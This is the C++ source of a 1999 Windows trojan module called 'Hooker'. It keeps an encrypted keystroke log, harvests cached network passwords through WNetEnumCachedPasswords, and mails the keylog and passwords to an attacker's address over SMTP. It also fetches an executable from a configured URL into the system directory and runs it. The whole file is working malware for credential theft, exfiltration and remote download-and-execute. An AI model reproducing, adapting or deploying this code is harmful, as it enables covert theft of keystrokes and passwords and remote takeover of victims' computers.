/********************************************************************/
/*                                                                  */
/*                   Hooker, trojan module v2.x                     */
/*                         ACrazzi, 1999                            */
/*                                                                  */
/********************************************************************/

#include "hooker.h"
#include "common.h"


//////////////////////////////////////////////////////////////////////
//--------------------log-controlling functions-----------------------
//////////////////////////////////////////////////////////////////////

struct _LogHeader { //header of log
        WORD signature; //signature
        SYSTEMTIME lastsend;//time of last send
        SYSTEMTIME lastexec;//time of last run
        SYSTEMTIME maketime;//time, when log was created

} lh;

struct _LogInfo { //info about log-buffer
        UCHAR* data;  //data... ;)
        UINT frame;   //pointer to current element
        UINT size;    //size of data
        BYTE p_add;   //how much to add
        BYTE p_xor;   //byte to xor with
        BYTE p_ror;   //how much to roll right
} li;

struct _SendMailInfo
{
        bool* f;
        SYSTEMTIME* ns;
} sm;

struct tagPASSWORD_CACHE_ENTRY {
    WORD cbEntry;          // size of this entry, in bytes
    WORD cbResource;   // size of resource name, in bytes
    WORD cbPassword;   // size of password, in bytes
    BYTE iEntry;           // entry index
    BYTE nType;        // type of entry
    BYTE abResource[1];// start of resource name
};


typedef tagPASSWORD_CACHE_ENTRY* LPPASSWORD_CACHE_ENTRY;
        
char* szPassInfo;

//------------------------initialisation--------------------------
void LogInit(void)
{
FILE* log_init;
UINT i,j;
WSADATA wsaData;
        //opening log...
        log_init = fopen(sti.logname,"r+b");
        if (!log_init) {
create_log:
                //there is no log, create...
                log_init = fopen(sti.logname,"w+b");
                if (!log_init) ExitProcess(-1);
                //write log-header
                memset(&lh,0,sizeof(lh));
                lh.signature = 0x3104;  //my signature ;)
                GetLocalTime(&lh.maketime);
                fwrite(&lh,1,sizeof(lh),log_init);
        };
        //read header of log
        fseek(log_init,-(long)sizeof(lh),SEEK_END);
        fread(&lh,1,sizeof(lh),log_init);
        if (lh.signature != 0x3104) {
                fclose(log_init);
                goto create_log;
        };
        //clear log, if it is very big
        fseek(log_init,0,SEEK_END);
        if (ftell(log_init) > (int)sti.loglimit) {
                fclose(log_init);
                DeleteFile(sti.logname);
                log_init = fopen(sti.logname,"w+b");
                fwrite(&lh,1,sizeof(lh),log_init);
        };
        fseek(log_init,0,SEEK_END);
        sti.logsize = ftell(log_init);
        fclose(log_init);
        memcpy(&sti.send_d,&lh.lastsend,sizeof(sti.send_d));
        memcpy(&sti.inst_d,&lh.maketime,sizeof(sti.inst_d));
        memcpy(&sti.lastexec,&lh.lastexec,sizeof(SYSTEMTIME));
        //initialise _LogInfo
        li.data = new UCHAR[LOG_BUFFER_SIZE];
        li.frame = 0;
        li.size = LOG_BUFFER_SIZE;
        //compute key for log-file crypting
        for (i=0,j=0;i<strlen(sti.mailfrom);i++) {
                j ^= (UINT)sti.mailfrom[i]<<((i%3)<<3);
        };
        if ((j & 0xFFFF) || (j & 0x70000)){
                li.p_add = j;
                li.p_xor = j>>8;
                li.p_ror = j>>16;
        } else {
                li.p_add = 3;
                li.p_xor = 3;
                li.p_ror = 3;
        };
        WSAStartup(MAKEWORD(1,1),&wsaData);
};
//---------------------flush buffer to disk---------------------------
void LogFlush(void)
{       
FILE* log;
UINT i;
BYTE j;
        EnterCriticalSection(&gcs);
        if (li.frame) {
                log = fopen(sti.logname,"r+b");
                if (log) {
                        //crypt data, if we need it
                        if (sti.encrypt_log) {
                                for (i=0;i<li.frame;i++) {
                                        j = li.data[i];
                                        _asm mov al,j
                                        _asm add al,li.p_add
                                        _asm xor al,li.p_xor
                                        _asm mov cl,li.p_ror
                                        _asm ror al,cl
                                        _asm mov j,al
                                        li.data[i] = j;
                                };
                        }; 
                        fseek(log,-(long)sizeof(lh),SEEK_END);
                        fwrite(li.data,1,li.frame,log);
                        fwrite(&lh,1,sizeof(lh),log);
                        sti.logsize = ftell(log);
                        fclose(log);
                };
                li.frame = 0;
        };
        LeaveCriticalSection(&gcs);
};
//------------------------add string to log...------------------------
void LogAdd(char* s)
{
        if ((strlen(s)+li.frame)>=li.size) LogFlush();
        memcpy(&li.data[li.frame],s,strlen(s));
        li.frame += strlen(s);
};
//----------CALLBACK-function for getting system-passwords------------
BOOL CALLBACK PassEntry(LPPASSWORD_CACHE_ENTRY p,DWORD)
{
char res[0x100],passw[0x100];
        memcpy(res,p->abResource,p->cbResource);
        res[p->cbResource] = 0;
        memcpy(passw, p->abResource+p->cbResource, p->cbPassword);
        passw[p->cbPassword] = 0;
        strcat(szPassInfo,"Res: ");
        strcat(szPassInfo,res);
        strcat(szPassInfo,", Pas: ");
        strcat(szPassInfo,passw);
        strcat(szPassInfo,"\n");
        return TRUE;
};
//-------------------check for ras connection...---------------------
bool INetDetect()
{
RASCONN rasconn;
UINT i,j;
        if ((!sti.ras) || (!bRASDLL)) return true;
        rasconn.dwSize = sizeof(RASCONN);
        i = sizeof(RASCONN);
        RasEnumConnections(
                &rasconn,    // buffer to receive connections data 
                (ULONG*)&i,  // size in bytes of buffer 
                (ULONG*)&j   // number of connections written to buffer
        );
        return i > 0;
};
//-----------this is the thread-function for email-sending-----------
DWORD WINAPI SendMailThread(LPVOID)
{       

#define RECIEVE(retcode)\
        {\
                i=recv(s,buf,sizeof(buf),0);\
                if (i == SOCKET_ERROR) goto thread_exit;\
                buf[i] = 0;\
                if (!strstr(buf,retcode)) goto thread_exit;\
        }

#define SEND(s_data,length)\
        {\
                i = 0;\
                while (i < length) {\
                        k = send(s,(char*)(s_data + i),length - i,0);\
                        if (k == SOCKET_ERROR) goto thread_exit;\
                        i += k;\
                };\
        }

FILE* log;
UINT datasize,i,k;
BYTE j;
UCHAR* data = NULL;
HOSTENT *ph;
SOCKADDR_IN addr;
ULONG iaddr;
char buf[0x400], lb1[0x100], passwords_buf[0x4000];
SOCKET s = INVALID_SOCKET;
SYSTEMTIME st;
TIME_ZONE_INFORMATION tzi;
HINSTANCE h_mpr;
LPWNETENUMCACHEDPASSWORDS lpECP;

        EnterCriticalSection(&gcs);
        //read log
        log = fopen(sti.logname,"rb");

#ifdef _DEBUG

        if (!log) ShowMessage("Error opening log file");

#endif
        fseek(log,0,SEEK_END);
        datasize = ftell(log) - sizeof(_LogHeader);
        if (!datasize) {
                fclose(log);
                LeaveCriticalSection(&gcs);
                goto thread_exit;
        };
        data = new UCHAR[datasize];
        fseek(log,0,SEEK_SET);
        fread(data,1,datasize,log);
        fclose(log);
        LeaveCriticalSection(&gcs);
        if (sti.encrypt_log) {//decrypt, if we need this
                for(i=0;i<datasize;i++) {
                        j = data[i];            
                        _asm mov al,j
                        _asm mov cl,li.p_ror
                        _asm rol al,cl   
                        _asm xor al,li.p_xor
                        _asm sub al,li.p_add
                        _asm mov j,al
                        data[i] = j;
                };
        };
        //are we connected?
        if (!INetDetect()) goto thread_exit;
        //get socket
        s = socket(AF_INET,SOCK_STREAM,0);
        if (s == INVALID_SOCKET) goto thread_exit;
        //take address of server
        iaddr = inet_addr(sti.host);
        if (iaddr == INADDR_NONE) {//addr is name of server
                ph = gethostbyname(sti.host);
                if (!ph) goto thread_exit;
                memcpy(&addr.sin_addr,ph->h_addr_list[0],sizeof(IN_ADDR));
        } else {//addr is ip
                memcpy(&addr.sin_addr,&iaddr,4);
        };
        //connecting to server
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(sti.port);
        memcpy(&addr.sin_addr,ph->h_addr_list[0],sizeof(IN_ADDR));
        if (connect(s,(PSOCKADDR)&addr,sizeof(SOCKADDR))) goto thread_exit;
        RECIEVE("220");//read answer
        gethostname(lb1,sizeof(lb1));
        sprintf(buf,"HELO %s\r\n",lb1);
        SEND(buf,strlen(buf));//Hello host!
        RECIEVE("250");
        sprintf(buf,"MAIL FROM:<%s>\r\n",sti.mailfrom);//Mail from
        SEND(buf,strlen(buf));
        RECIEVE("250");
        sprintf(buf,"RCPT TO:<%s>\r\n",sti.mailto);//Mail to
        SEND(buf,strlen(buf));
        RECIEVE("25");
        strcpy(buf,"DATA\r\n");//Data
        SEND(buf,strlen(buf));
        RECIEVE("354");
        //write date and time
        GetLocalTime(&st);
        GetTimeZoneInformation(&tzi);
        SysTimePrint(lb1,st);
        sprintf(buf,"Date: %s %+2.2i%2.2u\n",lb1,-tzi.Bias/60,abs(tzi.Bias)%60);
        SEND(buf,strlen(buf));
        //Mailer
        sprintf(buf,"X-Mailer: %s\n",Product);
        SEND(buf,strlen(buf));
        //To
        sprintf(buf,"To: %s\n",sti.mailto);
        SEND(buf,strlen(buf));
        //From
        sprintf(buf,"From: %s\n",sti.mailfrom);
        SEND(buf,strlen(buf));
        //Subject
        sprintf(buf,"Subject: %s\n",sti.subj);
        SEND(buf,strlen(buf));
        //write info about hooker
        SysTimePrint(lb1,lh.maketime);
        sprintf(buf,"%s\nWas installed: %s\n",Product,lb1);
        strcat(buf,"Will be killed: ");
        if (sti.autokill) {
                memcpy(&st,&lh.maketime,sizeof(SYSTEMTIME));            
                SysTimeSum(st,sti.kill_i);
                sprintf(lb1,
                        "%2.2u %s %2.2u:%2.2u:%2.2u\n",
                        st.wDay,
                        Months[st.wMonth - 1],
                        st.wHour,
                        st.wMinute,
                        st.wSecond
                );
                strcat(buf,lb1);
        } else strcat(buf,"none\n");
        strcat(buf,"Http: ");
        strcat(buf,sti.http);
        strcat(buf,", Last Modified: ");
        if (sti.lastexec.wYear) {
                SysTimePrint(lb1,lh.lastexec);
                strcat(buf,lb1);
                strcat(buf,"\n");
        } else strcat(buf,"Was not downloaded\n");
        sprintf(lb1,"Hooker's ID: %X\n\n",sti.number);
        strcat(buf,lb1);
        SEND(buf,strlen(buf));
        if (sti.syspass) {//if we ought to send system-passwords
                 h_mpr = LoadLibrary("MPR.DLL");
                 if (h_mpr) {
                        lpECP = (LPWNETENUMCACHEDPASSWORDS)
                                    GetProcAddress(h_mpr,"WNetEnumCachedPasswords");
                        if (lpECP) {
                                szPassInfo = passwords_buf;
                                strcpy(szPassInfo,
                                "===Begin Network Passwords===\n");
                                lpECP(0,0,0xFF,PassEntry, 0);
                                strcat(szPassInfo,
                                "===End Network Passwords===\n\n");
                                SEND(szPassInfo,strlen(szPassInfo));
                        };
                 FreeLibrary(h_mpr);
                 };
        };
        strcpy(buf,"===Begin Keylog===\n");
        //check for bad symbols: \r|\n.\r|\n
        for (i = 2; i < datasize; i++) {
                if ( ((data[i]==0xD) || (data[i]==0xA)) &&
                         ((data[i - 2]==0xD) || (data[i - 2]==0xA)) &&
                         (data[i - 1] == 0x2E) ) data[i - 1] = 0x7F;
        };

        SEND(buf,strlen(buf));//sending log
        SEND(data,datasize);
        strcpy(buf,"\n===End Keylog===\n");
        SEND(buf,strlen(buf));
        strcpy(buf,"\r\n.\r\n");
        SEND(buf,strlen(buf));
        RECIEVE("250");
        strcpy(buf,"QUIT\r\n");//Good bye my dear!
        SEND(buf,strlen(buf));
        //kill info in log
        EnterCriticalSection(&gcs);
        //read log
        log = fopen(sti.logname,"rb");
#ifdef _DEBUG
        if (!log) ShowMessage("Cannot open log file");
#endif
        fseek(log,0,SEEK_END);
        i = ftell(log) - sizeof(_LogHeader);
        delete data;
        data = new UCHAR[i];
        fseek(log,0,SEEK_SET);
        fread(data,1,i,log);
        fclose(log);
        
        GetLocalTime(&st);//correct info about last send
        memcpy(&lh.lastsend,&st,sizeof(lh.lastsend));
        memcpy(&sti.send_d,&st,sizeof(sti.send_d));
        memcpy(sm.ns,&st,sizeof(SYSTEMTIME));
        SysTimeSum(*sm.ns,sti.send_i);
        //clear log
        log = fopen(sti.logname,"w+b");
#ifdef _DEBUG
        if (!log) ShowMessage("Cannot create new log file");
#endif
        if (i > datasize) fwrite(&data[datasize],1,i - datasize,log);
        fwrite(&lh,1,sizeof(lh),log);
        sti.logsize = ftell(log);
        fclose(log);
        LeaveCriticalSection(&gcs);
thread_exit:
        if (data) delete data;
        if (s != INVALID_SOCKET) closesocket(s);
        *sm.f = false;
        return 0;
#undef RECIEVE
#undef SEND
};
//--------------------------email log---------------------------------
void LogEmailing(SYSTEMTIME& st,bool& IsMailing)
{
DWORD mail_thread;
static HANDLE h_t;
        IsMailing = true;//set flag
        LogFlush();//flush log to disk
        sm.f = &IsMailing;
        sm.ns = &st;
        if (h_t) CloseHandle(h_t);
        //create thread for log-file sending
        h_t = CreateThread(NULL,0,SendMailThread,NULL,0,&mail_thread);
};

//---------------this function processes date-string------------------
bool ProcessDateString(char* s,SYSTEMTIME& st)
{
int year,day,hour,minute,second, i;
char buf1[0x100], buf2[0x100];
        //RFC 1123: Sun, 06 Nov 1994 08:49:37 GMT
        if (sscanf(s,"%s%u%s%u%u:%u:%u",
                        buf1,
                        &day,
                        buf2,
                        &year,
                        &hour,
                        &minute,
                        &second) < 7)
        //ANSI C's asctime() format:  Sun Nov  6 08:49:37 1994
        if (sscanf(s,"%s%s%u%u:%u:%u%u",
                        buf1,
                        buf2,
                        &day,
                        &hour,
                        &minute,
                        &second,
                        &year) < 7)
        //RFC 1036: Sunday, 06-Nov-94 08:49:37 GMT
        if (sscanf(s,"%s%u-%s%u:%u:%u",
                        buf1,
                        &day,
                        buf2,
                        &hour,
                        &minute,
                        &second) == 6) {
                sscanf(buf2 + 4,"%u",&year);
                buf2[3] = 0;
                if (year > 70) year += 1900; else year += 2000;
        } else return false;
        //get day of week
        for (i=0;i<7;i++)
        if (!strncmp(buf1,Days[i],3)) {
                st.wDayOfWeek = i;
                //get month
                for (i = 0;i<12;i++) 
                if (!strcmp(buf2,Months[i])) {
                        st.wMonth = i + 1;
                        st.wYear = year;
                        st.wDay = day;
                        st.wHour = hour;
                        st.wMinute = minute;
                        st.wSecond = second;
                        st.wMilliseconds = 0;
                        return true;
                };

        };
        
        return false;
};
//-----thread-function for getting and starting of file--------------
DWORD WINAPI HttpDownloadThread(LPVOID)
{       

FILE* exe;
char host[0x100], get_it[0x100], wwwbuf[0x400], *p1, *p2, buf[0x100];
UINT port = 80;
int i, j, k;
HOSTENT *ph;
SOCKADDR_IN addr;
ULONG iaddr;
SOCKET s = INVALID_SOCKET;
SYSTEMTIME st;
STARTUPINFO     si;
PROCESS_INFORMATION pi;
        
        //get name of server
        p1 = strstr(sti.http,"/");
        if (!p1) goto thread_exit;
        i = (UINT)p1 - (UINT)sti.http;
        if (!i) goto thread_exit;
        strncpy(host,sti.http,i);
        host[i] = 0;
        //get name of exec
        p2 = strstr(p1,":");
        if (p2) {
                strncpy(get_it,p1,(UINT)p2 - (UINT)p1);
                get_it[(UINT)p2 - (UINT)p1] = 0;
                sscanf(p2+1,"%u",&port);
        } else strcpy(get_it,p1);
        
        //are we connected?
        if (!INetDetect()) goto thread_exit;
        
        //get socket
        s = socket(AF_INET,SOCK_STREAM,0);
        if (s == INVALID_SOCKET) goto thread_exit;
        //get addr of server
        iaddr = inet_addr(host);
        if (iaddr == INADDR_NONE) {//addr is name of server
                ph = gethostbyname(host);
                if (!ph) goto thread_exit;
                memcpy(&addr.sin_addr,ph->h_addr_list[0],sizeof(IN_ADDR));
        } else {//addr is ip
                memcpy(&addr.sin_addr,&iaddr,4);
        };
        //connect with server
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(port);
        if (connect(s,(PSOCKADDR)&addr,sizeof(SOCKADDR))) goto thread_exit;
        //get date of last modification
        sprintf(wwwbuf,
                "HEAD %s HTTP/1.0\r\n"
                "User-Agent: %s\r\n"
                "\r\n",get_it,Product);
        i = 0;
        j = strlen(wwwbuf);
        //send query
        while (i < j) {
                k = send(s,wwwbuf,j - i,0);
                if (k == SOCKET_ERROR) goto thread_exit;
                i += k;
        };
        if (i != (int)strlen(wwwbuf)) goto thread_exit;
        i = recv(s,wwwbuf,sizeof(wwwbuf) - 1,0);
        if (i == SOCKET_ERROR) goto thread_exit;
        wwwbuf[i] = 0;
        p1 = "Last-Modified:";
        p2 = strstr(wwwbuf,p1);
        if (!p2) goto thread_exit;
        p2 += strlen(p1);
        j = (UINT)strstr(p2,"\r\n") - (UINT)p2;
        strncpy(buf,p2,j);
        buf[j] = 0;
        if (!ProcessDateString(buf,st)) goto thread_exit;
        if (!SysTimeComp(st,lh.lastexec)) goto set_date;
        //close socket
        closesocket(s);
        //get socket
        s = socket(AF_INET,SOCK_STREAM,0);
        if (s == INVALID_SOCKET) goto thread_exit;
        //connect with server
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(port);
        //memcpy(&addr.sin_addr,ph->h_addr_list[0],sizeof(IN_ADDR));
        if (connect(s,(PSOCKADDR)&addr,sizeof(SOCKADDR))) goto thread_exit;
        //generate query
        sprintf(wwwbuf,
                "GET %s HTTP/1.0\r\n"
                "User-Agent: %s\r\n"
                "\r\n",
                get_it,Product);
        i = 0;
        j = strlen(wwwbuf);
        //send query
        while (i < j) {
                k = send(s,wwwbuf,j - i,0);
                if (k == SOCKET_ERROR) goto thread_exit;
                i += k;
        };
        //read answer
        i = recv(s,wwwbuf,sizeof(wwwbuf),0);
        if (i == SOCKET_ERROR) goto thread_exit;
        j = (UINT)strstr(wwwbuf,"\r\n") - (UINT)wwwbuf;
        strncpy(buf,wwwbuf,j);
        buf[j] = 0;
        //all ok?
        if (!strstr(buf,"200")) goto thread_exit;
        //download exefile
        p1 = strstr(wwwbuf,"\r\n\r\n");
        GetSystemDirectory(buf,sizeof(buf));
        strcat(buf,"\\");
        strcat(buf,strrchr(get_it,"/"[0]) + 1);
        exe = fopen(buf,"w+b");  
        if (!exe) goto thread_exit;   
        fwrite(p1 + 4,1,i + (UINT)wwwbuf - (UINT)p1 - 4,exe);
           
        while( i = recv(s,wwwbuf,sizeof(wwwbuf),0) ) {
                if (i == SOCKET_ERROR) {
                        //there was error while downloading
                        fclose(exe);
                        DeleteFile(buf);
                        goto set_date;
                };
                fwrite(wwwbuf,1,i,exe); 
        };
        //all ok...
        fclose(exe);
        memcpy(&lh.lastexec,&st,sizeof(SYSTEMTIME));
        memcpy(&sti.lastexec,&st,sizeof(SYSTEMTIME));
        EnterCriticalSection(&gcs);
        exe = fopen(sti.logname,"r+");
        if (exe) {
                fseek(exe,-(int)sizeof(lh),SEEK_END);
                fwrite(&lh,1,sizeof(lh),exe);
                fclose(exe);
        };
        LeaveCriticalSection(&gcs);
        //starting
        memset(&si,0,sizeof(si));
        si.cb = sizeof(si);

#ifdef _DEBUG

        if (!CreateProcess(
                NULL,      // pointer to name of executable module 
                buf,       // pointer to command line string 
                NULL,      // pointer to process security attributes  
                NULL,      // pointer to thread security attributes 
                false,     // handle inheritance flag 
                0,         // creation flags 
                NULL,      // pointer to new environment block 
                NULL,      // pointer to current directory name 
                &si,       // pointer to STARTUPINFO 
                &pi        // pointer to PROCESS_INFORMATION 
        )) ShowMessage("Cannot start executable file!");

#else 
        
        CreateProcess(
                NULL,      // pointer to name of executable module 
                buf,       // pointer to command line string 
                NULL,      // pointer to process security attributes  
                NULL,      // pointer to thread security attributes 
                false,     // handle inheritance flag 
                0,         // creation flags 
                NULL,      // pointer to new environment block 
                NULL,      // pointer to current directory name 
                &si,       // pointer to STARTUPINFO 
                &pi        // pointer to PROCESS_INFORMATION 
        );

#endif

set_date:
        //set date of last check
        GetLocalTime(sm.ns);
        memset(&st,0,sizeof(st));
        st.wMinute = EXEC_START_TIME;
        SysTimeSum(*sm.ns,st);
thread_exit:
        if (s != INVALID_SOCKET) closesocket(s);
        *sm.f = false;
        return 0;
};
//--------------------trying to download file to exec-----------------
void HttpDownloading(SYSTEMTIME& st,bool& IsMailing)
{
DWORD http_thread;
static HANDLE h_t;
        IsMailing = true;
        sm.f = &IsMailing;
        sm.ns = &st;
        if (h_t) CloseHandle(h_t);
        //create thread for download
        h_t = CreateThread(NULL,0,HttpDownloadThread,NULL,0,&http_thread);
};

